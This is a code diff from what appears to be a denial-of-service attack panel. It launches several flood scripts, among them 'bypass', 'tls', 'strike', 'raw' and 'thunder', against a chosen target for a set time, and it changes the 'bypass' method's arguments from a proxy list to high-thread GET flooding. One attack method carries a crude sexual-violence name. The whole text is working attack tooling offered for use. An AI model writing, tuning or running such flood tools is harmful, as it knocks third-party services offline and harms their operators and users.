@@ -269,7 +269,7 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
         sigma()
         } else if (methods === 'bypass') {
        pushOngoing(target, methods, duration)
-        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
+        exec(`node ${metode} ${target} ${duration} 100 100 GET`)
           sigma()
           } else if (methods === 'raw') {
        pushOngoing(target, methods, duration)
@@ -309,7 +309,7 @@ const flooder = path.join(__dirname, `/lib/cache/flooder.js`);
         exec(`node ${tls} ${target} ${duration} 100 100`)
         exec(`node ${strike} GET ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${kill} ${target} ${duration} 100 20`)
-	exec(`node ${bypass} ${target} ${duration} 100 10 proxy.txt`)
+	exec(`node ${bypass} ${target} ${duration} 100 100 GET`)
 	exec(`node ${raw} ${target} ${duration}`)
 	exec(`node ${thunder} ${target} ${duration} 100 100 proxy.txt`)
         exec(`node ${rape} ${duration} 100 proxy.txt 70 ${target}`)
